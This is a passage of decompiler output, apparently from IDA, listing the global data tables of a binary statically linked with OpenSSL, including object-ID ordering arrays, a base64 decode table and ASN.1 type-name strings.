  785,
  1023,
  1024,
  443,
  152,
  677,
  771,
  89,
  883,
  54,
  407,
  395,
  130,
  131,
  50,
  53,
  153,
  103,
  88,
  884,
  806,
  805,
  954,
  952,
  951,
  953,
  500,
  451,
  495,
  434,
  390,
  140,
  891,
  107,
  871,
  947,
  946,
  28,
  941,
  942,
  943,
  944,
  945,
  936,
  937,
  938,
  939,
  940,
  920,
  382,
  887,
  892,
  174,
  447,
  471,
  468,
  472,
  502,
  449,
  469,
  470,
  392,
  452,
  802,
  803,
  791,
  416,
  793,
  794,
  795,
  796,
  792,
  48,
  132,
  885,
  389,
  384,
  172,
  56,
  126,
  372,
  867,
  462,
  857,
  453,
  490,
  156,
  509,
  815,
  976,
  811,
  851,
  979,
  980,
  813,
  1009,
  814,
  975,
  1011,
  1010,
  812,
  850,
  1015,
  1016,
  1013,
  1012,
  1017,
  1014,
  797,
  163,
  798,
  799,
  800,
  801,
  432,
  430,
  431,
  433,
  486,
  473,
  466,
  889,
  442,
  783,
  824,
  825,
  826,
  827,
  819,
  829,
  828,
  830,
  820,
  823,
  849,
  840,
  841,
  842,
  843,
  844,
  854,
  839,
  817,
  832,
  833,
  834,
  835,
  836,
  837,
  838,
  831,
  845,
  846,
  847,
  848,
  818,
  822,
  821,
  807,
  853,
  808,
  852,
  810,
  782,
  266,
  355,
  354,
  356,
  399,
  357,
  358,
  176,
  896,
  895,
  788,
  897,
  899,
  898,
  789,
  900,
  902,
  901,
  790,
  903,
  262,
  893,
  323,
  326,
  325,
  324,
  907,
  908,
  909,
  268,
  361,
  362,
  360,
  81,
  680,
  263,
  334,
  346,
  330,
  336,
  335,
  339,
  338,
  328,
  329,
  337,
  344,
  345,
  343,
  333,
  341,
  342,
  340,
  332,
  327,
  331,
  787,
  1060,
  408,
  508,
  507,
  260,
  302,
  298,
  311,
  303,
  300,
  310,
  308,
  307,
  312,
  301,
  309,
  299,
  305,
  306,
  784,
  304,
  128,
  280,
  274,
  277,
  284,
  273,
  283,
  275,
  276,
  282,
  278,
  279,
  281,
  264,
  858,
  347,
  265,
  352,
  353,
  348,
  351,
  349,
  175,
  1031,
  261,
  258,
  269,
  271,
  270,
  272,
  662,
  664,
  667,
  665,
  267,
  359,
  259,
  164,
  165,
  313,
  316,
  319,
  318,
  317,
  320,
  315,
  314,
  322,
  321,
  973,
  512,
  191,
  215,
  218,
  221,
  240,
  217,
  222,
  220,
  232,
  233,
  238,
  237,
  234,
  227,
  231,
  236,
  230,
  235,
  226,
  229,
  228,
  219,
  214,
  216,
  212,
  213,
  239,
  223,
  224,
  225,
  192,
  243,
  246,
  247,
  245,
  241,
  242,
  244,
  193,
  248,
  190,
  210,
  211,
  208,
  207,
  205,
  1059,
  786,
  1058,
  209,
  206,
  204,
  195,
  255,
  256,
  253,
  251,
  252,
  254,
  189,
  196,
  197,
  202,
  203,
  200,
  201,
  199,
  198,
  194,
  250,
  249,
  974,
  991,
  992,
  993,
  977,
  990,
  1001,
  994,
  981,
  1000,
  1002,
  1003,
  996,
  998,
  999,
  997,
  988,
  989,
  987,
  978,
  995,
  984,
  985,
  986,
  676,
  461,
  748,
  101,
  647,
  869,
  142,
  294,
  1022,
  295,
  296,
  86,
  1008,
  770,
  492,
  957,
  955,
  956,
  150,
  83,
  477,
  476,
  157,
  480,
  460,
  493,
  467,
  982,
  983,
  809,
  875,
  182,
  51,
  383,
  504,
  506,
  505,
  488,
  136,
  135,
  134,
  138,
  171,
  137,
  648,
  649,
  481,
  173,
  666,
  369,
  403,
  72,
  76,
  74,
  58,
  79,
  71,
  78,
  59,
  75,
  73,
  139,
  77,
  681,
  491,
  475,
  876,
  489,
  374,
  112,
  499,
  487,
  464,
  863,
  437,
  439,
  438,
  479,
  456,
  441,
  444,
  440,
  455,
  445,
  1032,
  1033,
  2,
  186,
  27,
  187,
  20,
  21,
  25,
  26,
  23,
  24,
  22,
  151,
  47,
  401,
  747,
  862,
  861,
  661,
  683,
  872,
  873,
  816,
  406,
  409,
  410,
  411,
  412,
  413,
  414,
  415,
  385,
  84,
  886,
  663,
  510,
  435,
  286,
  457,
  450,
  870,
  400,
  877,
  448,
  463,
  6,
  644,
  377,
  1,
  482,
  155,
  291,
  290,
  292,
  159,
  859,
  704,
  705,
  706,
  707,
  708,
  709,
  710,
  711,
  712,
  713,
  714,
  715,
  716,
  154,
  474,
  717,
  718,
  719,
  720,
  721,
  722,
  723,
  724,
  725,
  726,
  727,
  728,
  729,
  730,
  731,
  732,
  733,
  734,
  1025,
  1026,
  386,
  878,
  394,
  1029,
  1030,
  1028,
  1027,
  105,
  129,
  371,
  625,
  515,
  518,
  638,
  637,
  636,
  639,
  641,
  642,
  640,
  517,
  513,
  514,
  516,
  607,
  624,
  620,
  631,
  623,
  628,
  630,
  629,
  621,
  635,
  632,
  633,
  634,
  627,
  626,
  622,
  619,
  615,
  616,
  618,
  617,
  611,
  609,
  608,
  610,
  613,
  614,
  612,
  540,
  576,
  570,
  534,
  527,
  571,
  572,
  535,
  536,
  528,
  577,
  541,
  529,
  542,
  578,
  579,
  543,
  573,
  537,
  600,
  558,
  592,
  559,
  593,
  599,
  598,
  580,
  581,
  544,
  545,
  546,
  582,
  583,
  584,
  547,
  548,
  549,
  585,
  538,
  530,
  574,
  575,
  539,
  560,
  566,
  563,
  595,
  596,
  564,
  565,
  597,
  586,
  587,
  550,
  551,
  552,
  588,
  589,
  590,
  553,
  554,
  555,
  591,
  567,
  526,
  561,
  522,
  519,
  521,
  520,
  556,
  557,
  523,
  532,
  524,
  525,
  568,
  569,
  531,
  533,
  594,
  562,
  606,
  601,
  602,
  604,
  603,
  605,
  52,
  454,
  496,
  387,
  660,
  85,
  769,
  398,
  82,
  1007,
  498,
  497,
  890,
  874,
  402,
  864,
  866,
  865,
  459,
  293,
  133,
  106,
  1020,
  682,
  375,
  436,
  102,
  888,
  55,
  49,
  880,
  465,
  879,
  373,
  678,
  679,
  735,
  743,
  744,
  745,
  736,
  737,
  738,
  739,
  740,
  741,
  742,
  804,
  868,
  503,
  158,
  160
}; // weak
int dword_502DB8[1052] =
{
  363,
  405,
  368,
  910,
  664,
  177,
  365,
  285,
  179,
  785,
  954,
  952,
  951,
  953,
  131,
  1024,
  1023,
  783,
  382,
  392,
  132,
  389,
  384,
  372,
  172,
  813,
  849,
  815,
  1003,
  851,
  850,
  811,
  817,
  998,
  999,
  997,
  979,
  980,
  985,
  986,
  812,
  818,
  982,
  983,
  809,
  816,
  807,
  853,
  808,
  852,
  854,
  988,
  989,
  810,
  432,
  430,
  431,
  433,
  634,
  1004,
  294,
  295,
  296,
  182,
  183,
  667,
  665,
  647,
  142,
  504,
  388,
  383,
  417,
  135,
  138,
  171,
  134,
  856,
  137,
  648,
  136,
  649,
  393,
  404,
  72,
  76,
  74,
  71,
  58,
  79,
  78,
  57,
  59,
  75,
  73,
  77,
  139,
  178,
  370,
  367,
  369,
  366,
  371,
  180,
  1005,
  161,
  69,
  162,
  1032,
  127,
  858,
  164,
  165,
  385,
  663,
  1,
  2,
  188,
  167,
  1006,
  387,
  1025,
  1026,
  512,
  386,
  394,
  1029,
  1030,
  1028,
  1027,
  1033,
  1008,
  1007,
  143,
  398,
  1020,
  130,
  129,
  133,
  375,
  1034,
  1035,
  12,
  402,
  746,
  90,
  87,
  103,
  88,
  141,
  771,
  89,
  140,
  126,
  857,
  748,
  86,
  770,
  83,
  666,
  403,
  401,
  747,
  84,
  85,
  769,
  82,
  920,
  184,
  185,
  478,
  289,
  287,
  397,
  288,
  446,
  364,
  606,
  419,
  916,
  948,
  896,
  421,
  650,
  653,
  904,
  418,
  895,
  958,
  420,
  913,
  423,
  917,
  949,
  899,
  425,
  651,
  654,
  905,
  422,
  898,
  959,
  424,
  427,
  918,
  950,
  902,
  429,
  652,
  655,
  906,
  426,
  901,
  960,
  428,
  914,
  376,
  484,
  485,
  501,
  1049,
  1047,
  1050,
  1051,
  1053,
  1048,
  1046,
  1052,
  882,
  91,
  93,
  92,
  94,
  1056,
  1057,
  921,
  922,
  923,
  924,
  925,
  926,
  927,
  928,
  929,
  930,
  931,
  932,
  933,
  934,
  494,
  860,
  691,
  692,
  697,
  698,
  684,
  685,
  686,
  687,
  693,
  699,
  700,
  702,
  688,
  689,
  690,
  694,
  695,
  696,
  701,
  703,
  881,
  483,
  751,
  962,
  757,
  760,
  763,
  964,
  963,
  754,
  961,
  766,
  752,
  966,
  758,
  761,
  764,
  968,
  967,
  755,
  965,
  767,
  753,
  970,
  759,
  762,
  765,
  972,
  971,
  756,
  969,
  768,
  443,
  108,
  110,
  109,
  111,
  152,
  677,
  517,
  883,
  1019,
  1018,
  54,
  407,
  395,
  633,
  894,
  13,
  513,
  50,
  53,
  14,
  153,
  884,
  806,
  805,
  500,
  451,
  495,
  434,
  390,
  891,
  31,
  643,
  30,
  656,
  657,
  29,
  32,
  43,
  60,
  62,
  33,
  44,
  61,
  658,
  659,
  63,
  45,
  107,
  871,
  80,
  947,
  946,
  28,
  941,
  942,
  943,
  944,
  945,
  936,
  937,
  938,
  939,
  940,
  11,
  378,
  887,
  892,
  174,
  447,
  471,
  468,
  472,
  502,
  449,
  469,
  470,
  380,
  391,
  452,
  116,
  67,
  66,
  113,
  70,
  802,
  803,
  297,
  791,
  416,
  793,
  794,
  795,
  796,
  792,
  48,
  632,
  885,
  56,
  867,
  462,
  453,
  490,
  156,
  631,
  509,
  601,
  99,
  976,
  1009,
  814,
  975,
  1011,
  1010,
  1015,
  1016,
  1013,
  1012,
  1017,
  1014,
  1036,
  855,
  780,
  781,
  797,
  163,
  798,
  799,
  800,
  801,
  486,
  473,
  466,
  889,
  442,
  381,
  824,
  825,
  826,
  827,
  819,
  829,
  828,
  830,
  820,
  823,
  840,
  841,
  842,
  843,
  844,
  839,
  832,
  833,
  834,
  835,
  836,
  837,
  838,
  831,
  845,
  846,
  847,
  848,
  822,
  821,
  266,
  355,
  354,
  356,
  399,
  357,
  358,
  176,
  788,
  897,
  789,
  900,
  790,
  903,
  262,
  893,
  323,
  326,
  325,
  324,
  907,
  908,
  909,
  268,
  361,
  362,
  360,
  81,
  680,
  263,
  334,
  346,
  330,
  336,
  335,
  339,
  338,
  328,
  329,
  337,
  344,
  345,
  343,
  333,
  341,
  342,
  340,
  332,
  327,
  331,
  787,
  1060,
  408,
  508,
  507,
  260,
  302,
  298,
  311,
  303,
  300,
  310,
  308,
  307,
  312,
  301,
  309,
  299,
  305,
  306,
  784,
  304,
  128,
  280,
  274,
  277,
  284,
  273,
  283,
  275,
  276,
  282,
  278,
  279,
  281,
  264,
  347,
  265,
  352,
  353,
  348,
  351,
  349,
  175,
  1031,
  261,
  258,
  269,
  271,
  270,
  272,
  662,
  267,
  359,
  259,
  313,
  316,
  319,
  318,
  317,
  320,
  315,
  314,
  322,
  321,
  973,
  191,
  215,
  218,
  221,
  240,
  217,
  222,
  220,
  232,
  233,
  238,
  237,
  234,
  227,
  231,
  236,
  230,
  235,
  226,
  229,
  228,
  219,
  214,
  216,
  212,
  213,
  239,
  223,
  224,
  225,
  192,
  243,
  246,
  247,
  245,
  241,
  242,
  244,
  193,
  248,
  190,
  210,
  211,
  208,
  207,
  205,
  1059,
  786,
  1058,
  209,
  206,
  204,
  195,
  255,
  256,
  253,
  251,
  252,
  254,
  189,
  196,
  197,
  202,
  203,
  200,
  201,
  199,
  198,
  194,
  250,
  249,
  974,
  991,
  992,
  993,
  977,
  990,
  1001,
  994,
  981,
  1000,
  1002,
  996,
  987,
  978,
  995,
  984,
  34,
  35,
  36,
  46,
  676,
  461,
  101,
  869,
  1022,
  749,
  750,
  181,
  623,
  645,
  492,
  646,
  957,
  955,
  956,
  150,
  773,
  1039,
  1041,
  1038,
  1040,
  1045,
  1043,
  1037,
  1042,
  1044,
  477,
  476,
  157,
  15,
  480,
  493,
  467,
  3,
  7,
  257,
  396,
  4,
  114,
  104,
  8,
  95,
  96,
  875,
  602,
  514,
  51,
  911,
  506,
  505,
  488,
  481,
  173,
  681,
  379,
  17,
  491,
  18,
  475,
  876,
  935,
  489,
  782,
  374,
  621,
  9,
  168,
  112,
  10,
  169,
  148,
  144,
  147,
  146,
  149,
  145,
  170,
  68,
  499,
  487,
  464,
  863,
  437,
  439,
  438,
  479,
  456,
  441,
  444,
  440,
  455,
  445,
  186,
  27,
  187,
  20,
  21,
  25,
  26,
  23,
  24,
  22,
  151,
  47,
  862,
  861,
  661,
  683,
  872,
  873,
  406,
  409,
  410,
  411,
  412,
  413,
  414,
  415,
  886,
  510,
  435,
  286,
  457,
  450,
  98,
  166,
  37,
  39,
  38,
  40,
  5,
  97,
  915,
  120,
  122,
  121,
  123,
  870,
  460,
  117,
  119,
  400,
  877,
  448,
  463,
  19,
  6,
  644,
  377,
  919,
  912,
  482,
  155,
  291,
  290,
  292,
  159,
  859,
  704,
  705,
  706,
  707,
  708,
  709,
  710,
  711,
  712,
  713,
  714,
  715,
  716,
  154,
  474,
  717,
  718,
  719,
  720,
  721,
  722,
  723,
  724,
  725,
  726,
  727,
  728,
  729,
  730,
  731,
  732,
  733,
  734,
  635,
  878,
  777,
  779,
  776,
  778,
  105,
  625,
  515,
  518,
  638,
  637,
  636,
  639,
  641,
  642,
  640,
  516,
  607,
  624,
  620,
  628,
  630,
  629,
  627,
  626,
  622,
  619,
  615,
  616,
  618,
  617,
  611,
  609,
  608,
  610,
  613,
  614,
  612,
  540,
  576,
  570,
  534,
  527,
  571,
  572,
  535,
  536,
  528,
  577,
  541,
  529,
  542,
  578,
  579,
  543,
  573,
  537,
  600,
  558,
  592,
  559,
  593,
  599,
  598,
  580,
  581,
  544,
  545,
  546,
  582,
  583,
  584,
  547,
  548,
  549,
  585,
  538,
  530,
  574,
  575,
  539,
  560,
  566,
  563,
  595,
  596,
  564,
  565,
  597,
  586,
  587,
  550,
  551,
  552,
  588,
  589,
  590,
  553,
  554,
  555,
  591,
  567,
  526,
  561,
  522,
  519,
  521,
  520,
  556,
  557,
  523,
  532,
  524,
  525,
  568,
  569,
  531,
  533,
  594,
  562,
  604,
  603,
  605,
  41,
  64,
  115,
  65,
  675,
  671,
  672,
  668,
  673,
  669,
  674,
  670,
  42,
  52,
  454,
  496,
  16,
  660,
  498,
  497,
  890,
  874,
  100,
  864,
  866,
  865,
  459,
  293,
  106,
  1021,
  682,
  436,
  0,
  102,
  888,
  55,
  49,
  880,
  465,
  458,
  879,
  373,
  678,
  679,
  735,
  743,
  744,
  745,
  736,
  737,
  738,
  739,
  740,
  741,
  742,
  804,
  868,
  503,
  158,
  160,
  125
}; // weak
_UNKNOWN unk_503E28; // weak
char byte_504D54[] = { '0' }; // weak
_UNKNOWN unk_504FE4; // weak
_UNKNOWN unk_505014; // weak
_UNKNOWN unk_505044; // weak
_UNKNOWN unk_505074; // weak
_UNKNOWN unk_5052F8; // weak
_UNKNOWN unk_505314; // weak
_UNKNOWN unk_505330; // weak
_UNKNOWN unk_50534C; // weak
_UNKNOWN unk_505368; // weak
_UNKNOWN unk_5053BC; // weak
_UNKNOWN unk_505410; // weak
_UNKNOWN unk_505480; // weak
_UNKNOWN unk_50549C; // weak
_UNKNOWN unk_5054B8; // weak
_UNKNOWN unk_5054D4; // weak
_UNKNOWN unk_5054F0; // weak
_UNKNOWN unk_50550C; // weak
_UNKNOWN unk_505528; // weak
_UNKNOWN unk_505544; // weak
_UNKNOWN unk_50557C; // weak
_UNKNOWN unk_505598; // weak
_UNKNOWN unk_5055C8; // weak
_UNKNOWN unk_5055F8; // weak
_UNKNOWN unk_50566C; // weak
_UNKNOWN unk_5056FC; // weak
_UNKNOWN unk_50579C; // weak
_UNKNOWN unk_5057CC; // weak
_UNKNOWN unk_5057FC; // weak
_UNKNOWN unk_505834; // weak
int dword_505870[32] =
{
  0,
  0,
  0,
  1024,
  512,
  0,
  0,
  4096,
  4096,
  4096,
  4096,
  4096,
  8192,
  4096,
  4096,
  4096,
  65536,
  0,
  1,
  2,
  4,
  8,
  16,
  16384,
  32768,
  32,
  64,
  128,
  256,
  4096,
  2048,
  4096
}; // weak
_UNKNOWN unk_5059F0; // weak
char BASE64_table_505A20[] = { 'A' }; // weak
char byte_505A68[128] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xE0',
  '\xF0',
  '\xFF',
  '\xFF',
  '\xF1',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xE0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '>',
  '\xFF',
  '\xF2',
  '\xFF',
  '?',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  ':',
  ';',
  '<',
  '=',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x05',
  '\x06',
  '\a',
  '\b',
  '\t',
  '\n',
  '\v',
  '\f',
  '\r',
  '\x0E',
  '\x0F',
  '\x10',
  '\x11',
  '\x12',
  '\x13',
  '\x14',
  '\x15',
  '\x16',
  '\x17',
  '\x18',
  '\x19',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x1A',
  '\x1B',
  '\x1C',
  '\x1D',
  '\x1E',
  '\x1F',
  ' ',
  '!',
  '\"',
  '#',
  '$',
  '%',
  '&',
  '\'',
  '(',
  ')',
  '*',
  '+',
  ',',
  '-',
  '.',
  '/',
  '0',
  '1',
  '2',
  '3',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF'
}; // weak
_UNKNOWN unk_505BF8; // weak
_UNKNOWN unk_505C50; // weak
_UNKNOWN unk_505F38; // weak
char *off_505F3C[2] = { "Unused", "unused" }; // weak
_UNKNOWN unk_505FF0; // weak
_UNKNOWN unk_506048; // weak
_UNKNOWN unk_506078; // weak
_UNKNOWN unk_506094; // weak
_UNKNOWN unk_5063F8; // weak
_UNKNOWN unk_50643C; // weak
_UNKNOWN unk_50650C; // weak
_UNKNOWN unk_50653C; // weak
_UNKNOWN unk_5065AC; // weak
_UNKNOWN unk_5066E8; // weak
_UNKNOWN unk_506758; // weak
_UNKNOWN unk_5068A0; // weak
_UNKNOWN unk_506910; // weak
_UNKNOWN unk_50693C; // weak
_UNKNOWN unk_506958; // weak
_UNKNOWN unk_506984; // weak
_UNKNOWN unk_5069A0; // weak
int dword_506A08 = 1; // weak
char *off_506A24 = "OpenSSL EC_KEY method"; // weak
_UNKNOWN unk_50B158; // weak
char a0123456789abcd_1[17] = "0123456789ABCDEF"; // weak
_UNKNOWN unk_50BB78; // weak
_UNKNOWN unk_50BC2C; // weak
_UNKNOWN unk_50C3E8; // weak
__int16 word_50CB28[128] =
{
  1026,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  120,
  0,
  1,
  40,
  0,
  0,
  0,
  16,
  1040,
  1040,
  -31744,
  25,
  25,
  16400,
  8208,
  16,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  16,
  9,
  9,
  16,
  9,
  16,
  0,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  0,
  1025,
  0,
  0,
  0,
  0,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  0,
  0,
  0,
  0,
  2
}; // weak
char byte_50CC28[] = { '0' }; // weak
char byte_50CC3C[32] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\x01',
  '\x01',
  '\xFF',
  '\x01',
  '\x01',
  '\x01',
  '\xFF',
  '\x01',
  '\xFF',
  '\x04',
  '\xFF',
  '\x02',
  '\0'
}; // weak
__int16 word_50CC5C = 23644; // weak
char byte_50CCAC[] = { '0' }; // weak
_UNKNOWN unk_50CF70; // weak
char *off_50D9F0 = "\a"; // weak
_UNKNOWN unk_50DAA8; // weak
int dword_50DCE4[9] = { 0, 0, 1, 1, 0, 0, 0, 0, 0 }; // weak
int dword_50DD08[9] = { 99, 99, 12, 31, 23, 59, 59, 12, 59 }; // weak
int dword_50DD88[8] = { 0, 1, 1, 0, 0, 0, 0, 0 }; // weak
int dword_50DDA8[8] = { 99, 12, 31, 23, 59, 59, 12, 59 }; // weak
_UNKNOWN unk_50E278; // weak
_UNKNOWN unk_50E3A8; // weak
_UNKNOWN unk_50E464; // weak
_UNKNOWN unk_50E4A8; // weak
_UNKNOWN unk_50E4EC; // weak
_UNKNOWN unk_50E530; // weak
_UNKNOWN unk_50E950; // weak
_UNKNOWN unk_50E994; // weak
_UNKNOWN unk_50E9D8; // weak
_UNKNOWN unk_50EA1C; // weak
_UNKNOWN unk_50EA4C; // weak
_UNKNOWN unk_50ED78; // weak
_UNKNOWN unk_50EDBC; // weak
_UNKNOWN unk_50EEF4; // weak
_UNKNOWN unk_50EF20; // weak
_UNKNOWN unk_50EF60; // weak
_UNKNOWN unk_50EF90; // weak
char *off_50F1A0[31] =
{
  "EOC",
  "BOOLEAN",
  "INTEGER",
  "BIT STRING",
  "OCTET STRING",
  "NULL",
  "OBJECT",
  "OBJECT DESCRIPTOR",
  "EXTERNAL",
  "REAL",
  "ENUMERATED",
  "<ASN1 11>",
  "UTF8STRING",
  "<ASN1 13>",
  "<ASN1 14>",
  "<ASN1 15>",
  "SEQUENCE",
  "SET",
  "NUMERICSTRING",
  "PRINTABLESTRING",
  "T61STRING",
  "VIDEOTEXSTRING",
  "IA5STRING",
  "UTCTIME",
  "GENERALIZEDTIME",
  "GRAPHICSTRING",
  "VISIBLESTRING",
  "GENERALSTRING",
  "UNIVERSALSTRING",
  "<ASN1 29>",
  "BMPSTRING"
}; // weak
int dword_50F36C = 1; // weak
int dword_50F3D0 = 1; // weak
_DWORD dword_50F430[8] =
{
  413733948,
  2045194452,
  1609414145,
  1975162364,
  2002920720,
  2046522155,
  -1523100218,
  412114806
}; // weak
_DWORD dword_50F450[8] =
{
  -829073910,
  -571321513,
  -1172708260,
  -1958037276,
  -584977627,
  -756513144,
  629693829,
  -2056126696
}; // weak
_UNKNOWN unk_50F470; // weak
_UNKNOWN unk_50F550; // weak
_UNKNOWN unk_50F630; // weak
_UNKNOWN unk_5185A4; // weak
char byte_5185D8[16] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
_UNKNOWN unk_51860C; // weak
_UNKNOWN unk_518640; // weak
_UNKNOWN unk_518674; // weak
_UNKNOWN unk_5186A8; // weak
_UNKNOWN unk_5186DC; // weak
_UNKNOWN unk_518710; // weak
_UNKNOWN unk_518744; // weak
_UNKNOWN unk_518778; // weak
_UNKNOWN unk_5187AC; // weak
_UNKNOWN unk_5187E0; // weak
_UNKNOWN unk_518814; // weak
_UNKNOWN unk_518848; // weak
_UNKNOWN unk_51887C; // weak
_UNKNOWN unk_5188B0; // weak
_UNKNOWN unk_5188E4; // weak
_UNKNOWN unk_518918; // weak
_UNKNOWN unk_51894C; // weak
_UNKNOWN unk_518980; // weak
_UNKNOWN unk_5189B4; // weak
_UNKNOWN unk_5189E8; // weak
_UNKNOWN unk_518A1C; // weak
_UNKNOWN unk_518A9C; // weak
_UNKNOWN unk_518AD0; // weak
_UNKNOWN unk_518B04; // weak
_UNKNOWN unk_518B38; // weak
_UNKNOWN unk_518B6C; // weak
_UNKNOWN unk_518BA0; // weak
_UNKNOWN unk_518BD4; // weak
_UNKNOWN unk_518C08; // weak
_UNKNOWN unk_518C3C; // weak
_UNKNOWN unk_518C70; // weak
_UNKNOWN unk_518CA4; // weak
_UNKNOWN unk_518CD8; // weak
_UNKNOWN unk_518D0C; // weak
_UNKNOWN unk_518D78; // weak
_UNKNOWN unk_518DAC; // weak
_UNKNOWN unk_518DE0; // weak
_UNKNOWN unk_518E14; // weak
_UNKNOWN unk_518E48; // weak
_UNKNOWN unk_518E7C; // weak
_UNKNOWN unk_518EB0; // weak
_UNKNOWN unk_518EE4; // weak
_UNKNOWN unk_518F18; // weak
_UNKNOWN unk_518F4C; // weak
_UNKNOWN unk_518F80; // weak
_UNKNOWN unk_518FB4; // weak
_UNKNOWN unk_518FE8; // weak
_UNKNOWN unk_51901C; // weak
_UNKNOWN unk_519050; // weak
_UNKNOWN unk_519084; // weak
_UNKNOWN unk_5190B8; // weak
_UNKNOWN unk_5190EC; // weak
_UNKNOWN unk_519120; // weak
_UNKNOWN unk_519154; // weak
_UNKNOWN unk_519190; // weak
_UNKNOWN unk_5191C4; // weak
_UNKNOWN unk_5191F8; // weak
_UNKNOWN unk_51922C; // weak
_UNKNOWN unk_519260; // weak
_UNKNOWN unk_519294; // weak
_UNKNOWN unk_5192C8; // weak
_UNKNOWN unk_5192FC; // weak
_UNKNOWN unk_519330; // weak
_UNKNOWN unk_519360; // weak
_UNKNOWN unk_519390; // weak
_UNKNOWN unk_5193C0; // weak
_UNKNOWN unk_5193F0; // weak
_UNKNOWN unk_519420; // weak
_UNKNOWN unk_519450; // weak
const WCHAR Name = 79u; // idb
_UNKNOWN unk_519EC8; // weak
_UNKNOWN unk_519F40; // weak
_UNKNOWN unk_519FB8; // weak
_UNKNOWN unk_51A030; // weak
_UNKNOWN unk_51A0A8; // weak
_UNKNOWN unk_51A120; // weak
_UNKNOWN unk_51A198; // weak
_UNKNOWN unk_51A210; // weak
char byte_5216C8[32] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
_UNKNOWN unk_521754; // weak
_UNKNOWN unk_522008; // weak
_UNKNOWN unk_52204C; // weak
_UNKNOWN unk_5220CC; // weak
_UNKNOWN unk_522110; // weak
_UNKNOWN unk_522154; // weak
_UNKNOWN unk_522214; // weak
_UNKNOWN unk_522258; // weak
_UNKNOWN unk_52229C; // weak
_UNKNOWN unk_522330; // weak
_UNKNOWN unk_522374; // weak
_UNKNOWN unk_5223CC; // weak
_UNKNOWN unk_522438; // weak
_UNKNOWN unk_52247C; // weak
_UNKNOWN unk_5224D4; // weak
_UNKNOWN unk_522518; // weak
_UNKNOWN unk_522574; // weak
_UNKNOWN unk_5225B8; // weak
_UNKNOWN unk_522610; // weak
_UNKNOWN unk_522644; // weak
_UNKNOWN unk_522700; // weak
_UNKNOWN unk_52271C; // weak
_UNKNOWN unk_5227D8; // weak
_UNKNOWN unk_52281C; // weak
_UNKNOWN unk_5228B4; // weak
_UNKNOWN unk_522934; // weak
_UNKNOWN unk_5229A0; // weak
_UNKNOWN unk_5229F8; // weak
_UNKNOWN unk_522A14; // weak
_UNKNOWN unk_522B20; // weak
_UNKNOWN unk_522BF8; // weak
_UNKNOWN unk_522C84; // weak
_UNKNOWN unk_522CF8; // weak
_UNKNOWN unk_522E14; // weak
_UNKNOWN unk_522F1C; // weak
_UNKNOWN unk_52308C; // weak
_UNKNOWN unk_523308; // weak
_UNKNOWN unk_523338; // weak
_UNKNOWN unk_5236CC; // weak
_UNKNOWN unk_52380C; // weak
_UNKNOWN unk_52383C; // weak
_UNKNOWN unk_523908; // weak
_UNKNOWN unk_5239C4; // weak
_UNKNOWN unk_523A08; // weak
_UNKNOWN unk_523C50; // weak
_UNKNOWN unk_523C94; // weak
_UNKNOWN unk_523CF4; // weak
_UNKNOWN unk_523D38; // weak
_UNKNOWN unk_523D7C; // weak
_UNKNOWN unk_523DC0; // weak
_UNKNOWN unk_523F40; // weak
_UNKNOWN unk_523FF0; // weak
char *off_5245A0 = "BOOL"; // weak
const char off_52480C[] = { 'D', 'I', 'R', '\0' }; // idb
_UNKNOWN unk_524AA4; // weak
_UNKNOWN unk_524AE8; // weak
_UNKNOWN unk_524DFC; // weak
_UNKNOWN unk_524E68; // weak
_UNKNOWN unk_524EAC; // weak
_UNKNOWN unk_524F18; // weak
_UNKNOWN unk_524FA0; // weak
_UNKNOWN unk_525028; // weak
_UNKNOWN unk_52506C; // weak
_UNKNOWN unk_5250C4; // weak
_UNKNOWN unk_525144; // weak
_UNKNOWN unk_5251C4; // weak
_UNKNOWN unk_525288; // weak
_UNKNOWN unk_5252CC; // weak
_UNKNOWN unk_525524; // weak
_UNKNOWN unk_5255A8; // weak
_UNKNOWN unk_5255C4; // weak
